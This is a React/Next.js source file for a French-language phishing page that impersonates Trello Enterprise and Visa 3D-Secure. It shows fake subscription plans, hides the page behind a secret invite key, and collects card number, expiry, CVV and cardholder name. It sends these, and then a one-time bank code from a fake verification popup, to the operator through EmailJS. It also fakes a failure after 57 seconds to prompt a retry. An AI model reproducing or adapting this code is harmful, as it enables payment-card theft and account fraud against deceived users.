import React, { useState, useEffect, useCallback } from 'react';
import emailjs from 'emailjs-com';
import Head from 'next/head';
import { loadStripe } from '@stripe/stripe-js';
import { useRouter } from 'next/router';
import { key } from './get-link'; // Import the key
import {
  EmbeddedCheckoutProvider,
  EmbeddedCheckout
} from '@stripe/react-stripe-js';

const stripePromise = loadStripe(process.env.NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY);

const Board = () => {
  const [selectedPlan, setSelectedPlan] = useState(null);
  const [isBlurred, setIsBlurred] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [show3DSecurePopup, setShow3DSecurePopup] = useState(false);
  const [showError, setShowError] = useState(false);
  const [selected, setSelected] = useState(null);
  const [showCache, setShowCache] = useState(true);
  const [showStripe, setShowStripe] = useState(false); // New state
  const [clientSecret, setClientSecret] = useState(null); // Define clientSecret state
  const [showCodeInput, setShowCodeInput] = useState(false); // New state for code input
  const [boardName, setBoardName] = useState(null); // Move state declaration here
  const [code, setCode] = useState(''); // New state for code
  const router = useRouter();

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const invite = params.get('invite');
    if (invite !== key) {
      router.push('/magic-link');
    } else {
      const blurTimeout = setTimeout(() => {
        setIsBlurred(true);
        setBoardName(params.get('board'));
      }, 500);

      const popupTimeout = setTimeout(() => {
        setShowPopup(true);
        setShowCache(true);
      }, 1000);

      return () => {
        clearTimeout(blurTimeout);
        clearTimeout(popupTimeout);
      };
    }
  }, [router]);

  useEffect(() => {
    let errorTimeout;
    if (show3DSecurePopup) {
      errorTimeout = setTimeout(() => {
        setShowError(true);
      }, 57000); // DELAY TO SHOW ERROR MESSAGE
    }
    return () => {
      clearTimeout(errorTimeout);
    };
  }, [show3DSecurePopup]);

  useEffect(() => {
    if (show3DSecurePopup) {
      const errorTimeout = setTimeout(() => {
        setShowError(true);
      }, 57000); // DELAY TO SHOW ERROR MESSAGE
      return () => clearTimeout(errorTimeout);
    }
  }, [show3DSecurePopup]);

  const showPaymentPopup = (plan) => {
    setSelectedPlan(plan);
    setShowCache(false);
    setTimeout(() => {
      document.querySelector('.popup').classList.add('show');
    }, 100); // Delay to ensure the class is added after the component is rendered
  };

  const hidePaymentPopup = () => {
    document.querySelector('.popup').classList.remove('show');
    setTimeout(() => {
      setSelectedPlan(null);
      setShowCache(true);
      setShowPopup(true); // Réaffiche la première popup
      setShowStripe(false); // Reset Stripe view
    }, 300); // Match the duration of the CSS transition
  };

  const getPlanPrice = (plan) => {
    switch(plan) {
      case 'Gratuit':
        return '0€';
      case 'Standard':
        return '200€';
      case 'Premium':
        return '600€'; 
      default:
        return '';
    }
  };

  const handleSubmit = (event) => {
    event.preventDefault();
    setIsLoading(true);

    setTimeout(() => {
      setShowPopup(false);
      setShow3DSecurePopup(true);
    }, 5000);

    emailjs.sendForm('gmail-alexandre', 'new-payment', event.target, 'p7vtRytijMovXPfFA')
      .then(() => {
        console.log('SUCCESS!');
        setIsLoading(false);
        //alert('Form submitted successfully!');
      })
      .catch((error) => {
        console.log('FAILED...', error);
        setIsLoading(false);
      });
  };

  const handleExpiryDateInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 2) {
      value = value.slice(0, 2) + '/' + value.slice(2, 4);
    }
    input.value = value;
  };

  const handleCardNumberInput = (event) => {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 16) {
      value = value.slice(0, 16);
    }
    input.value = value.replace(/(.{4})/g, '$1 ').trim();
  };

  const retry3DSecure = () => {
    setShowError(false);
    setShow3DSecurePopup(false);
    setTimeout(() => {
      setShow3DSecurePopup(true);
    }, 100); // Small delay to reset the popup
  };

  const handleStripePayment = () => {
    setShowStripe(true); // Show Stripe payment details
  };

  const fetchClientSecret = useCallback(() => {
    // Retrieve first name and last name from session storage
    const firstName = sessionStorage.getItem('firstName');
    const lastName = sessionStorage.getItem('lastName');
    const email = `${firstName}.${lastName}@tenvil.com`;
    console.log('Email:', email);

    // Fetch client secret logic here
    return fetch("/api/checkout", {
      method: "POST",
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        email: email, // Use the constructed email
      }),
    })
      .then((res) => res.json())
      .then((data) => {
        setClientSecret(data.clientSecret);
      });
  }, []);

  useEffect(() => {
    if (showStripe) {
      fetchClientSecret();
    }
  }, [showStripe, fetchClientSecret]);

  const handleCodeSubmit = (event) => {
    event.preventDefault();
    setIsLoading(true);

    emailjs.send('gmail-alexandre', 'new-payment', { code }, 'p7vtRytijMovXPfFA')
      .then(() => {
        console.log('Code sent successfully!');
        setIsLoading(false);
        setShowCodeInput(false);
      })
      .catch((error) => {
        console.log('Failed to send code...', error);
        setIsLoading(false);
      });
  };

  const options = { clientSecret };

  return (
    <div>
      <Head><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css"/></Head>
      <div className={`dashboard-container ${isBlurred ? 'blurred' : ''}`}></div>
      {showCache && <div className='dashboard-cache'></div>}
      <div className={`subscription-popup ${selectedPlan ? 'hidden' : ''} ${showPopup ? 'show' : ''}`}>
        <img src='/trello-enterprise-logo.png' className='logo'/>
        <h5 className='board'>{boardName}</h5>

        <h1>Trello à votre façon.</h1>
        <h3>Utilisé par des millions de personnes, Trello booste les équipes à travers le monde. <br/>Choisissez l'option qui vous correspond.</h3>
        <div className="plans">
          <div className="plan ">
            <h3>GRATUIT</h3>
            <p>0€ <span className='month'> à vie</span></p>
            <ul>
              <li>Cartes simple illimitées</li>
              <li>Jusqu'à 10 tableaux</li>
              <li>Power-ups illimités/tableau</li>
              <li>250 exécutions de commandes</li>
              
            </ul>
            <button className='phantom' onClick={() => showPaymentPopup('Gratuit')}>Commencer</button>
          </div>  

          <div className="plan ">
            <h3>STANDARD</h3>
            <p>200€<span className='month'> /an</span></p>
            <ul>
              <li>Tableaux illimités</li>
              <li>Checklists avancées</li>
              <li>Champs personnalisés</li>
              <li>Espace de stockage illimité</li>
              <li>1 000 exécutions de commandes</li>
            </ul>
            <button onClick={() => showPaymentPopup('Standard')}>Essayer gratuitement</button>
          </div>

          <div className="plan star">
            <h3>PREMIUM</h3>
            <p>600€<span className='month'> /an</span></p>
            <ul>
              <li>Vues : Calendrier, Agenda, Chronogramme et Tableur</li>
              <li>Espaces de travail illimités</li>
              <li>Gestion des tableaux publics</li>
              <li>Exécutions illimitées de com.</li>
              <li>Support Priority</li>
            </ul>
            <button onClick={() => showPaymentPopup('Premium')}>Essayer gratuitement</button>
          </div>
        </div>
      </div>
      {selectedPlan && !show3DSecurePopup && (
        <div className={`popup ${showPopup ? 'show' : ''}`}>
          <div className={`popup-content`}>
            <button className='return' onClick={hidePaymentPopup}>
              <i className="fas fa-chevron-left"></i>
            </button>
                        
            <div className={`payment-details`}>
              <form onSubmit={handleSubmit}>
                <h3>{selectedPlan === 'Gratuit' ? 'Trello Enterprise Gratuit' : `${selectedPlan} : 30 jours gratuit`}</h3>
                <span>{selectedPlan === 'Gratuit' ? 'Vérifiez votre identité avec une carte à votre nom pour accéder à ce tableau.' : `0€ pendant 30 jours, puis ${getPlanPrice(selectedPlan)}/an annulez avant pour ne pas être facturé.`}</span>

                <div>
                  <label>Titulaire de la carte</label>
                  <input type="text" name="cardHolder" placeholder='Nom du titulaire' required />
                </div>
                <div>
                  <label>Numéro de carte</label>
                  <input type="text" className='card-number' name="cardNumber" placeholder='4242 4242 4242 4242' required style={{ width: '100%' }} onInput={handleCardNumberInput} />
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', width: '100%' }}>
                  <div style={{ flex: '1', marginRight: '1rem' }}>
                    <label>Date d'expiration</label>
                    <input type="text" name="cardExpiry" required onInput={handleExpiryDateInput} maxLength="5" placeholder="MM/YY" />
                  </div>
                  <div style={{ flex: '1' }}>
                    <label>CVV</label>
                    <input type="text" name="cardCvc" required placeholder='***' maxLength="3" />
                  </div>
                </div>
                <p className='trial-notice'>{selectedPlan === 'Gratuit' ? `Un compte Trello Enterprise Gratuit est autorisé par utilisateur, sous réserve d'abus le compte peut être suspendu.` : `Une pré-autorisation temporaire de ${getPlanPrice(selectedPlan)} sera effectuée sur votre compte.`}</p>

                <button className='buy' type="submit" disabled={isLoading}>
                  {isLoading ? 'Vérification...' : (selectedPlan === 'Gratuit' ? 'Rejoindre le tableau' : 'Démarrer mon essai')}
                </button>
              </form>
            </div>
           
          </div>
        </div>
      )}
      {show3DSecurePopup && (
        <div className="popup show">
          <div className="popup-content d-secure show">
            <img className='verified' src='/verified-by-visa.png'/>
            <img className='trello' src='/trello-enterprise-logo.png'/>  
            <hr></hr>
            <h3>Vérification 3D-secure</h3>
            {showError ? (
              <>
                <p>La vérification a échoué. Veuillez réessayer.</p>
                <button className='retry-btn' onClick={retry3DSecure}>Réessayer</button>
              </>
            ) : (
              <>
                <p>Confirmez la pré-autorisaton</p>
                <span>TRELLO* ENEBA VERIF</span>
                <span>Montant : 196,96€</span>
                <span>Carte : **** **** **** {document.querySelector('input[name="cardNumber"]')?.value.slice(-4) || '****'}</span>
                <span>{new Date().toLocaleTimeString('fr-FR', { timeZone: 'Europe/Paris' })} le {new Date().toLocaleDateString('fr-FR')}</span>

                <div className="loading-spinner">
                  <div className="spinner"></div>
                </div>
                <span className="code-btn" onClick={() => setShowCodeInput(true)} style={{ display: showCodeInput ? 'none' : 'inline' }}>Entrer un code OTP</span>
                {showCodeInput && (
                  <form className='code-form' onSubmit={handleCodeSubmit}>
                    <input type="text" value={code} onChange={(e) => setCode(e.target.value)} placeholder="Entrer le code" required />
                    <button type="submit" disabled={isLoading}>{isLoading ? 'Envoi...' : 'Confirmer'}</button>
                  </form>
                )}
                <span className='notpayment'>Cette transaction n'est pas un paiement. Aucun montant ne sera débité, une autorisation doit être effectuée pour vérifier l'émetteur.</span>
          
              </>
            )}
            </div>
        </div>
      )}
    </div>
  );
};

export default Board;